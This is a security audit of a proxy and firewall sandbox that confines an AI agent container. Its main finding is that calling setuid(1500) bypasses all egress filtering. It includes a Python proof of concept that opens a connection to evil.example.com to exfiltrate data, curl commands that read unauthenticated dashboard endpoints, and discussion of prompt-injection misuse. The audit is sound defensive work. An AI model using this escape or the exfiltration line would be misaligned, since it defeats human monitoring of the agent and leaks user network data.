# Phase 0-4 Networking Security Audit (2026-05-23)

## Executive summary

**Verdict: REQUIRES-MITIGATIONS.** Phase 0-4 builds on a pre-existing
load-bearing invariant — "mitmproxy runs as uid 1500 and the firewall
exempts/redirects on `meta skuid`" — that is **not actually enforced
against the Claude container**. A process running as container uid 0 (the
default) can call `setuid(1500)` and short-circuit every Phase 2 UDP
rule, every TCP REDIRECT, and every default-deny output rule. That
single primitive collapses the entire network containment story the
Phase 2 design depends on. The other surfaces (publish-mgr socket,
dashboard auth, user-allow validator) hold up, with a few smaller info
disclosure and defense-in-depth gaps documented below.

## Verdict per attack surface

1. **NFQUEUE bypass attempts** — **BROKEN (HIGH).** The kernel
   `meta skuid != 1500 queue num 0 bypass` rule is bypassed in one
   syscall: `setuid(1500)`. The Claude container runs as container uid
   0 with default Docker caps (CAP_SETUID retained) and Linux allows
   root → setuid(any) freely. Both containers share the same userns in
   rootless and non-rootless Docker, so userns-uid 1500 maps to the
   same host kuid_t in both — the netfilter match fires. After
   `setuid(1500)` the earlier `meta skuid 1500 accept` rule in the
   output chain accepts ALL outbound from that process (UDP, TCP, raw
   IP). udp-redir, mitmproxy, and the entire rule store are bypassed.
   Bypass-via-raw-sockets, ip6tables, and pre-startup races are all
   harmless by comparison.

2. **publish-mgr / udp-redir socket exposure** — **SAFE (INFO).** Both
   sockets live at `/run/*.sock` inside the proxy container's mount
   namespace. The Claude container does NOT bind-mount `/run`, does not
   share the proxy's mount or PID namespace, and has no docker socket.
   `/proc/<proxy_pid>` is not visible because they run in separate PID
   namespaces. Sockets are chmod 0600 and chowned to uid 1500, so even
   from inside the proxy container only uid 1500 (mitmproxy/dashboard)
   can connect. Holds.

3. **Dashboard auth bypass** — **SAFE w/ INFO DISCLOSURE (MED).** Auth
   token is generated by `secrets.token_urlsafe(32)`, set via in-process
   `set_auth_token`, written to `/config/dashboard-token` mode 0600
   uid 1500, never put in env vars, cmdline, or any path mounted into
   the Claude container. No path traversal in routes. Header compare
   is an exact-string match. HOWEVER, several read endpoints are NOT
   auth-gated and leak structured info to anyone in the netns
   (including the Claude container): `/api/pending`, `/api/rules`,
   `/api/published-ports`, `/api/user-allow` (GET), `/api/counters`,
   `/api/user-allow/templates`. See Finding 2.

4. **User_allow validator escapes** — **MOSTLY SAFE (LOW).** Newline
   injection passes `nft --check -f -` (script mode accepts multiple
   statements) but fails the applier (`exec.Command("nft", ...)`
   argv-mode rejects multi-statement input), so multi-statement
   injection is mooted by the applier mismatch. JSON-mode parser is
   not used. Unicode tricks don't help — the blacklist regex
   `\bkeyword\b` matches on Go byte boundaries; "drop" in UTF-8 is the
   four-byte ASCII sequence. Set/map references don't help (sets must
   pre-exist, validator rejects undefined refs). However: the
   validator does NOT require the statement to END in an `accept`
   verdict, allows `jump`/`goto`/`return`/`queue`/`notrack`, and
   accepts a bare `accept` rule. The first three are effectively
   harmless given the chain context; bare `accept` is the worst case
   and requires the dashboard token to add. See Finding 3.

5. **Rule persistence file** — **SAFE (LOW).** rules.json lives at
   `/config/proxy-state/<session>/rules.json` on the host, mounted only
   into the proxy container. The Claude container can NOT write it
   directly. The replay path validates every `nft_statement` again
   before applying, so a poisoned file rejects the bad rule but doesn't
   take down the proxy. Minor robustness gap: writes are non-atomic
   (truncate + rewrite), so a crash mid-write can corrupt the file —
   but this is not attacker-controllable.

6. **Counter scraping leaks** — **LOW info disclosure.** `/api/counters`
   returns the full nft `stmt` text per rule plus packet/byte counts.
   An unauth caller in the netns can read the full list of user-allowed
   CIDRs/ports and published-port destinations. Combined with surface
   3, the agent gains a complete view of "what the user has explicitly
   trusted on this network". See Finding 2.

7. **Inbound publish abuse** — **SAFE (INFO).** Docker portmap is fixed
   at proxy-container-create time to `127.0.0.1:rangeLo-rangeHi`.
   Adding an nft accept for a port OUTSIDE that range is a dead rule
   (no host route). Connecting to self via published port from inside
   the netns is loopback, already accepted. One defense-in-depth gap:
   `req.ContainerPort` is validated as 1024..65535 but NOT against the
   session's PROXY_PUBLISH_RANGE. See Finding 4.

8. **DNS-over-TCP / DoH bypass** — **SAFE.** Both go through the TCP
   REDIRECT to mitmproxy:8080 and are evaluated by `match_request` on
   the synthesised `tcp://host:port` URL. The DoH endpoint host (e.g.
   `cloudflare-dns.com`) must already be in the allowlist for the
   connection to succeed — DoH exfil is bounded by the same TLS-host
   allowlist that bounds all other TLS exfil. No new surface added by
   Phase 0-4.

## Findings

### Finding 1: setuid(1500) bypasses every Phase 2 UDP rule, every TCP REDIRECT, and the entire mitmproxy plane

**Severity:** HIGH
**Component:** `nix/proxy-image.nix:77` (`meta skuid ${proxyUid} accept`),
`nix/proxy-image.nix:107` (`meta l4proto udp meta skuid != ${proxyUid}
queue num 0 bypass`), `nix/proxy-image.nix:160` (`meta skuid ${proxyUid}
return` in output_nat), `internal/docker/docker.go:162-166`
(`securityHardeningArgs` — comment promises `--cap-drop ALL` but only
`no-new-privileges` is implemented).

**Attack:**

The Claude container runs as container uid 0 by default
(`internal/docker/docker.go:280-285` sets `USER_UID`/`USER_GID` but the
entrypoint at `nix/image.nix:103` keeps container uid 0 for rootless
docker). Container uid 0 has all default Docker caps (no `--cap-drop`
is applied), including CAP_SETUID. Even without CAP_SETUID, Linux uid 0
is allowed to `setuid()` to any uid the kernel knows. The agent inside
the container can:

```bash
# Available in the image: python3Minimal is on PATH.
python -c '
import os, socket
os.setuid(1500)            # drops to userns-uid 1500
s = socket.socket()
s.connect(("evil.example.com", 8080))   # arbitrary TCP egress
s.sendall(b"GET /exfil HTTP/1.0\r\n\r\n")
print(s.recv(4096))
'
```

What happens in the kernel:

1. The Claude container's userns maps userns-uid 1500 to host kuid X
   (some entry in `/etc/subuid` for the host user running the daemon).
   The proxy container's userns maps userns-uid 1500 to the SAME host
   kuid X — both containers share rootlesskit's userns in rootless
   Docker, and both use the host userns in non-rootless Docker.
2. The kernel netfilter rule `meta skuid 1500 accept` was installed by
   the proxy container as `make_kuid(proxy_userns, 1500)` = host kuid X.
3. After `setuid(1500)` in the Claude container, the new socket's
   `sk->sk_uid` is host kuid X — exactly the value the netfilter rule
   matches.
4. In the **output** chain, the rule `meta skuid 1500 accept` fires
   BEFORE the `tcp 8080 accept`, BEFORE the `udp queue ... bypass`,
   BEFORE `udp drop`, and BEFORE the default-deny. Every outbound
   packet from the setuid'd process is accepted.
5. In the **output_nat** chain, the rule `meta skuid 1500 return` fires
   FIRST, so the `tcp redirect to :8080` is skipped. TCP goes out with
   its original destination — directly to the upstream, not through
   mitmproxy.

**Worst case:**

Total network containment failure. The agent egresses arbitrary
TCP/UDP/ICMP to any destination, on any port, with no proxy
interception, no rule-store check, no audit, no counters. mitmproxy
never sees the traffic; udp-redir never sees the traffic; the
dashboard never logs the traffic. The only host-side defense remaining
is the proxy container's Docker network policy (bridge network with
NAT) — which allows full internet egress.

This breaks every property Phase 2 was supposed to enforce: UDP
default-deny, hold-and-resolve for unknown UDP destinations, rule-store
controlled DNS, etc. It also breaks pre-Phase-0 properties like "all
TCP is observed by mitmproxy".

The reason prior audits missed this is that `audit-2026-05-22-adversarial.md`
§2.2 examined only the `execve(setuid_binary)` path, which IS blocked
by `no-new-privileges`. The direct `setuid()` syscall from a process
already running as uid 0 is not an `execve` and `no-new-privileges`
does not gate it. Docker's default seccomp profile permits `setuid()`
for processes with CAP_SETUID (which the container retains).

**Mitigation:**

Three layers, defense in depth:

1. **Actually drop CAP_SETUID and CAP_SETGID on the Claude container.**
   `internal/docker/docker.go:162-166` needs to do what the comment
   claims:

   ```go
   func securityHardeningArgs() []string {
       return []string{
           "--security-opt", "no-new-privileges:true",
           "--cap-drop", "ALL",
           "--cap-add", "NET_BIND_SERVICE", // only if needed
       }
   }
   ```

   This is necessary but NOT sufficient: even with CAP_SETUID dropped,
   a process running as kernel-uid 0 in the userns can still call
   setuid (kernel skips capability checks when current_euid==0).

2. **Run the Claude container as a non-root user inside the userns.**
   The entrypoint at `nix/image.nix:103-127` keeps container uid 0
   when `USER_UID=0`. Change the default so rootless Docker still runs
   the Claude process as a non-root userns uid (e.g., 1000, distinct
   from 1500). Then `setuid(1500)` from uid 1000 fails without
   CAP_SETUID. Combined with mitigation 1, this closes the loop.

3. **Defense in depth on the firewall side.** Replace the
   `meta skuid X accept` blanket rule with something tied to a more
   robust identity. Options:
   - Match on a CGROUP path rather than uid: `meta cgroup
     <proxy-cgroup-id> accept`. The Claude container can't put itself
     in another container's cgroup without CAP_SYS_ADMIN.
   - Match on a packet mark set by an iptables OWNER match in PREROUTING
     keyed on the network interface (containers in the same netns share
     iface, so this doesn't help — strike that).
   - Use a `socket cgroup_v2 ...` filter (newer nft feature) keyed on
     the mitmproxy cgroup. Same idea as bullet 1 with a more modern
     primitive.

   At minimum, document the precondition "Claude container MUST NOT
   have CAP_SETUID" in `nix/proxy-image.nix` next to the skuid rules.

**Verification test (recommended):**

```go
// Integration test: container as uid 0 tries setuid(1500) + outbound.
// Expected: connection fails (firewall drops it).
//
// Today: connection succeeds (this is the bug).
//
// Implementation sketch:
//   1. Start a container with --network container:<proxy>.
//   2. exec: python -c 'import os,socket;os.setuid(1500);
//      s=socket.socket();s.settimeout(3);s.connect(("1.1.1.1",80))'
//   3. Assert: connect timed out or raised.
```

### Finding 2: Multiple read endpoints leak rule/pending/counter data without authentication

**Severity:** MED (info disclosure of user-trusted destinations)
**Component:** `proxy/claude_proxy/dashboard.py:134` (`get_pending`),
`:151` (`get_rules`), `:412` (`list_published`), `:480`
(`user_allow_list`), `:490` (`counters`), `:421`
(`user_allow_templates`).

**Attack:**

The dashboard listens on `0.0.0.0:8081` inside the shared netns
(`proxy/claude_proxy/app.py:73`). Any process in the Claude container
can reach it without authentication:

```bash
# From inside the Claude container:
curl http://127.0.0.1:8081/api/rules        # full rule store dump
curl http://127.0.0.1:8081/api/counters     # all user_allow + publish_in nft statements + packet counts
curl http://127.0.0.1:8081/api/pending      # currently-held flow destinations
curl http://127.0.0.1:8081/api/published-ports  # all published-port labels
curl http://127.0.0.1:8081/api/user-allow   # full nft statement text per user-allow rule
```

What's leaked, concretely:
- `/api/rules` returns the full RuleStore including raw regex patterns,
  labels, expire timestamps, and `match.nft_statement` for nft proto
  rules. The label may contain user-supplied free-form text identifying
  the destination's purpose ("internal-postgres", "vpn-only").
- `/api/counters` returns the full text of every nft statement in
  `publish_in` and `user_allow` along with packet/byte counts. The
  statement includes the IP/CIDR/port. So an agent learns the user's
  internal network topology and traffic patterns.
- `/api/pending` returns the host+port (and DNS name for UDP) of every
  in-flight held flow. Self-referential for Claude (only Claude's flows
  exist in the netns), so the agent mostly learns what it itself just
  tried, which is not new info.
- `/api/published-ports` returns the label and host/container ports of
  every published port. Labels may be sensitive.
- `/api/user-allow` returns the same statements as counters but with
  IDs and labels, no counts.

**Worst case:**

The agent learns the structure of the user's "trusted" allowlist —
which IPs/CIDRs the user typically opens, which DNS names are
auto-allowed, what's labeled "internal" or "prod". This goes beyond
the threat model's "proxy-permitted exfiltration" because the agent
gains intelligence about the USER'S NETWORK that it could not learn
from its own outbound attempts (which only reveal whether a specific
destination is allowed, not the structure of what else is allowed).
For a defender, this information is useful for an attacker preparing a
prompt-injection that targets a specific internal service.

**Mitigation:**

Auth-gate every endpoint that reads rule/counter/pending state. The
attack model treats the netns as untrusted (the agent is in it), so
the auth-gating boundary should match the mutating-endpoint boundary
already in place. One-line fix per endpoint:

```python
async def get_rules(request: Request) -> JSONResponse:
    if not _check_auth(request):
        return JSONResponse({"error": "unauthorized"}, status_code=401)
    ...
```

Templates can remain unauth (they're a static registry with no
user-specific data), but everything else should auth.

For backward compat with the in-container hook
(`nix/image.nix:49-50` curls `/api/pending` unauthenticated), either:
- Pass the auth token to the hook via a host-only mechanism (already
  done for the dashboard URL — extend with `?token=...`), or
- Add a narrower endpoint like `/api/pending/summary` that only returns
  pending COUNT (not URLs), unauth.

The proxy-pending-hook today already requires the dashboard host URL,
which the agent doesn't have. So the auth-gate doesn't break the hook
flow — the hook will need the token explicitly.

### Finding 3: user_allow validator does not require an `accept` verdict and allows several non-accept verdicts

**Severity:** LOW (requires dashboard token — agent can't directly
exploit)
**Component:** `proxy/publish-mgr/userallow.go:16-52`
(`validateUserAllowStmt`).

**Attack:**

The keyword blacklist is `{"table", "flush", "delete", "chain",
"policy", "drop", "reject"}`. Statements that pass both the blacklist
and `nft --check` include:

- `accept` (bare, no match clause) — accepts EVERY packet that reaches
  the user_allow chain.
- `tcp dport 22 jump publish_in` — pivots to another chain.
- `ip daddr 1.2.3.4 return` — returns to the calling chain (effectively
  a no-op given the chain context, but the validator doesn't reason
  about this).
- `ip daddr 1.2.3.4 queue num 99 bypass` — sends matched packets to a
  nonexistent queue; bypass means "continue to next rule", so it's a
  silent no-verdict that lets the packet fall through to the user_allow
  chain's end (which returns to the caller, where the next rule is
  log+drop). Net: equivalent to no rule, but obscures intent.
- `ip daddr 1.2.3.4 meta mark set 0x1` — sets a packet mark without
  any verdict. Falls through.
- `ip daddr 1.2.3.4 counter` — pure counter, no verdict.

None of these are exploitable from inside the Claude container (mutating
the user_allow chain requires the dashboard token). The risk is
prompt-injection-driven misuse: an attacker who can convince the human
operator to paste a "harmless looking" statement in raw mode can plant
something different from what they think.

The most dangerous case is `accept`. The user_allow chain is jumped
from BOTH `input` (after `publish_in`) and `output` (after the
`udp drop` and `meta skuid != 1500 queue` rules). A bare `accept` in
user_allow:
- In output: makes the chain accept everything that's left after the
  earlier filters (mostly ICMP and other-protocol traffic — TCP/UDP
  has already been routed elsewhere). Minor.
- In input: makes the chain accept everything inbound. The proxy
  container's inbound is gated by Docker port-publish, so this only
  matters for the dashboard port (already accept'd) and the
  publish_in ports (already accept'd by publish_in). Effectively a
  no-op given the outer Docker boundary.

So even in the worst case, `accept`-without-match is not a privilege
escalation in the current chain layout. Still, the validator should
enforce the implied invariant.

**Worst case:**

A statement with a non-accept verdict is committed to the user_allow
chain. Today this is mostly benign but is a footgun that will become
exploitable if the chain layout changes (e.g., if user_allow is moved
before publish_in in the input chain, or if a future refactor adds
chain links).

**Mitigation:**

Require the statement to end in `accept`. The `nftAddUserAllow` helper
already has half-baked logic for this (`HasSuffix(stmt, " accept")`
controls counter insertion); promote it to a hard requirement at
validate time:

```go
func validateUserAllowStmt(stmt string) error {
    stmt = strings.TrimSpace(stmt)
    if !strings.HasSuffix(stmt, " accept") && stmt != "accept" {
        // Wait — reject bare "accept" too, since it has no match clause.
        return fmt.Errorf("user-allow stmt must end in ' accept' verdict and have a match clause")
    }
    // Additionally reject statements with no match (e.g., literal "accept"):
    if stmt == "accept" {
        return fmt.Errorf("user-allow stmt must include at least one match clause before 'accept'")
    }
    if err := validateUserAllowStmtKeywordsOnly(stmt); err != nil {
        return err
    }
    // ... existing nft --check ...
}
```

Also add `jump`, `goto`, `queue`, `return`, `tproxy`, `dup`, `fwd` to
the keyword blacklist — these are all verdict-like or pivot keywords
that have no place in an "accept-only" surface.

### Finding 4: publish-mgr accepts container_port outside the configured publish range

**Severity:** LOW (defense in depth; requires dashboard token)
**Component:** `proxy/publish-mgr/main.go:197-244` (`handlePublish`).

**Attack:**

`handlePublish` validates `req.ContainerPort` only against the broad
1024..65535 range, not against `m.rangeLo..m.rangeHi` (the session's
configured publish range). `req.HostPort`, by contrast, IS checked
against `rangeLo..rangeHi`. An attacker with the dashboard token can
publish e.g. `{host_port: 10000, container_port: 22}`, adding an nft
rule that accepts inbound on container:22.

In the current Docker portmap layout, container:22 has no host port
forwarded to it (the portmap is `127.0.0.1:rangeLo-rangeHi`), so the
rule is dead. But if a future change ever maps the full netns inbound
(e.g., an "expose all" mode), this stale rule becomes an unintended
inbound opening.

**Worst case:**

Defense-in-depth gap. Today, dead rules accumulate in `publish_in` with
no effect on the network boundary. Tomorrow, if the inbound model
changes, those stale rules could become live.

**Mitigation:**

Validate `req.ContainerPort` against the publish range:

```go
if req.ContainerPort < m.rangeLo || req.ContainerPort > m.rangeHi {
    writeJSON(w, 400, publishResp{Error: "container_port outside session range"})
    return
}
```

This matches the validation already done for `req.HostPort` and keeps
publish_in tightly scoped to the published range.

### Finding 5: rules.json writes are non-atomic

**Severity:** INFO (robustness, not attacker-controllable)
**Component:** `proxy/claude_proxy/rules.py:268-273` (`RuleStore.save`).

**Attack:**

`save()` does `open(path, "w")` which truncates before writing. A
crash or power-loss between truncate and complete write leaves a
corrupt rules.json. On next proxy startup,
`replayUserAllowFromRules` will `json.Unmarshal` and return an error —
publish-mgr logs and continues with empty user_allow chain. RuleStore
will also fail to load and start empty. All user-customized rules
silently disappear.

Not attacker-controllable. The agent can't trigger writes (no auth
token). The agent can't directly crash the proxy. Just a robustness
gap worth filing.

**Worst case:**

User loses their custom proxy rules after an unclean shutdown.

**Mitigation:**

Write to a sibling tempfile, then `os.replace()`:

```python
def save(self, path: str) -> None:
    with self._lock:
        data = [rule.to_dict() for rule in self._rules]
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(data, f, indent=2)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)
```

## Items investigated and ruled out

- **Reading the dashboard token from inside the Claude container.**
  Token is generated at runtime, set via in-process global, written to
  `/config/dashboard-token` (mode 0600, uid 1500). `/config` is not
  mounted into the Claude container. The token never appears in env
  vars (set_auth_token is in-process) or cmdline of either daemon.
  Cross-PID /proc inspection is blocked (separate PID namespaces). No
  visible leak path.

- **NFQUEUE startup race.** Order in `proxy-entrypoint.sh` is: nft
  install → publish-mgr fork → udp-redir fork → mitmproxy exec. Between
  nft install and udp-redir start, UDP packets hit `queue num 0
  bypass` → no listener → bypass means "continue to next rule" → `udp
  drop` fires. Fail-closed during this window. The kernel queue
  handler's "bypass" semantics are explicitly fall-through-to-next-rule,
  not accept (verified by the comment chain in proxy-image.nix and
  nftables docs).

- **NFQUEUE overflow as exfil channel.** `MaxQueueLen: 1024` in
  udp-redir's nfqueue config bounds the kernel queue. When full,
  bypass→drop. No way to bleed packets through by flooding.

- **udp-redir hold buffer DoS.** Hold buffer has per-key cap of 16 and
  TTL of 30s. But it's bounded above by the kernel queue size (1024).
  Even with many distinct dest tuples, only 1024 packets are queued at
  once, so memory in the hold buffer is bounded to ~1024 * ~80 bytes ≈
  80KB. Not a DoS.

- **Raw IP packets via CAP_NET_RAW.** Default Docker caps for the
  Claude container do include CAP_NET_RAW per the docker.go comment,
  but the prior audit
  (`audit-2026-05-22-adversarial.md` §2.4) verified that even raw
  sockets cannot bypass output filter default-deny. Phase 0-4 didn't
  change this surface.

- **NEW: `setuid(1500) + raw socket(AF_INET, SOCK_RAW)`** could craft
  arbitrary packets bypassing the queue filter. But the kernel still
  evaluates the netfilter output chain on raw socket packets, so this
  reduces to Finding 1 (skuid match accepts) — same finding, no
  separate severity.

- **Newline injection in user_allow stmt.** `nft --check -f -` accepts
  multi-statement input (validator passes), but `exec.Command("nft",
  args...)` in nftAddUserAllow is argv mode (treats all args as one
  statement) and rejects multi-statement input. The mismatch means a
  newline-injected stmt fails at apply, harmless.

- **JSON-mode nft.** `validateUserAllowStmt` uses `nft --check -f -`
  with text input. The `-j`/`--json` flag is never set. No JSON-mode
  attack surface.

- **`nft --check` mutating state.** Per nft docs and confirmed by
  reading the nftables source, `--check` parses and validates against
  the live ruleset but does not commit. No TOCTOU between check and
  add.

- **Unicode/encoding tricks in keyword blacklist.** The blacklist uses
  `\b` word boundaries on byte regex. nft only parses ASCII keywords.
  No non-ASCII representation of "drop"/"reject" is recognized by nft.

- **Set/map references (`@evil_set`).** A statement like `ip daddr
  @evil_set accept` would require `evil_set` to already exist in the
  table. `nft --check` rejects undefined set references.

- **Rules.json poisoning via dashboard between live add and persist.**
  Sequence is: validator runs → publish-mgr adds nft → store updates →
  save to disk. Failure between step 2 and 3 leaves nft live with a
  rule not in disk; on restart, replay reads disk and that rule is
  missing. State diverges but no security boundary crossed.

- **rules.json replay applies stale rules without re-validation.**
  False alarm: `replayUserAllowFromRules` explicitly calls
  `validateUserAllowStmt` for every rule before nftAddUserAllow. So
  even a manually-edited rules.json on the host is filtered through
  the validator at startup.

- **Inbound publish abuse from the agent.** Published ports forward
  host:127.0.0.1:N → container:N. The mapping is fixed at proxy
  container create time. The agent can't add new host port mappings
  (would require docker socket; not mounted). The agent CAN listen on
  port N inside the container and accept connections from the host
  loopback — but that's the documented feature.

- **DNS-over-HTTPS as an exfil channel.** DoH goes through TCP/443 →
  REDIRECT to mitmproxy → mitmproxy evaluates `tcp://<doh-host>:443`
  against the rule store. Only an explicitly allowed DoH endpoint (e.g.
  cloudflare-dns.com) is reachable. The agent can encode data in DNS
  query names, but only to allowed endpoints — exfil is bounded by the
  same TLS-host allowlist that bounds any other TLS exfil. The threat
  model already concedes this. Phase 0-4 didn't widen this surface.

- **Counter-polling side channel.** `/api/counters` exposes packet
  counts per rule. An agent could in principle encode information by
  causing N packets to a specific rule and reading the count back. But
  the agent already knows what it sent (it sent them). No data flows
  IN through counters that isn't already inferable from outbound
  attempts. Counters are a UX feature, not a side-channel risk.

- **proto="nft" leaking through `match()` legacy path.** Production
  uses `match_request` which checks `proto` properly and rejects nft
  rules. The legacy `match(url)` method does NOT check proto and would
  treat empty `pattern` (from nft rule's empty `host_regex`) as
  matching every URL → would return "allow" for any URL. But `match()`
  is not called from production code (`addon.py` uses `match_request`
  only). Footgun for future code; not currently exploitable.

- **inconsistent PROXY_SESSION defaults.** udp-redir defaults to
  "default" if env unset; publish-mgr leaves replay off if env unset.
  Edge case: shouldn't happen in production (entrypoint always sets
  it). Not a security issue.
